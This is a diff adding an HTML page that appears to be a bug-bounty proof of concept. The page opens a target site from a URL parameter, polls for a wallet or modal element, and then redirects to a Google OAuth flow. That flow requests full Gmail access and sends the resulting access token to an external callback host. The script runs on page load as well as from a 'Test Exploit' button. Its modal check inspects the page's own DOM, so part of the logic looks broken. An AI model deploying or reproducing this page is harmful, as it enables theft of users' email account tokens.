@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: white;
+            width: 100%;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+
+        #container {
+            position: relative;
+            text-align: center;
+        }
+
+        #bg-image {
+            max-width: 20%;
+            display: block;
+            margin: 0 auto;
+        }
+
+        #exploit-button {
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: black;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #exploit-button:hover {
+            background-color: #444;
+        }
+    </style>
+    <script>
+        function getParamName(name, target) {
+            if (!target) target = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(target);
+            if (!results) return 'index.html';
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        let hunter;
+        let b_length;
+        var urlParam = getParamName('target');
+        
+        function init() {
+            b_length = hunter.length;
+            console.log("Setting baselength to " + b_length);
+            watch();
+        }
+        
+        function watch() {
+            // Check if a modal exists in the DOM
+            const modal = document.querySelector('.modal, [class*="modal"], #connect-wallet');
+            
+            if (modal) {
+                // Modal is present, log and redirect
+                console.log("Modal detected on screen!");
+                console.log("Modal element:", modal);
+                console.log('Google Navigation');
+                window.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id=92872884978-fd7hoogqudduc5eutv400o6rj3tdcj0h.apps.googleusercontent.com&redirect_uri=https://bugbountyhunter.xyz/callback.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+            } else {
+                // No modal yet, keep polling
+                console.log("watch(): No modal detected yet");
+                setTimeout(watch, 100); // Increased to 100ms for better performance
+            }
+        }
+        
+        // Start watching (you can call this when needed, e.g., on page load)
+        watch();
+
+        function launch() {
+            hunter = window.open(urlParam, "hunter", "");
+            setTimeout(init, 4000);
+        }
+
+         //window.onload = launch();
+        launch();
+    </script>
+</head>
+<body>
+    <div id="container">
+        <img id="bg-image" src="https://bugbountyhunter.xyz/images/hlabs-black-logo.png">
+        <button id="exploit-button" onclick="launch()">Test Exploit</button>
+    </div>
+</body>
+</html>
